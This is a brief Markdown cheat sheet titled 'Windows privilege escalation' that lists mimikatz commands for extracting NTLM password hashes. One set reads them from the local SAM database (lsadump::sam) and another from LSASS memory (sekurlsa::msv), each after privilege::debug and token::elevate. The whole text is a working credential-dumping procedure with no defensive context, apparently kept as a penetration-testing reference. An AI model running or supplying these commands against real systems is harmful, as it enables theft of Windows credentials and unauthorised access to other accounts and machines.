---
title: Windows privilege escalation
---

## Extracting NTLM hash

```powershell
mimikatz.exe
```

### From local SAM

```powershell
> privilege::debug
> token::elevate
> lsadump::sam
```

### From LSASS memory

```powershell
> privilege::debug
> token::elevate
> sekurlsa::msv
```
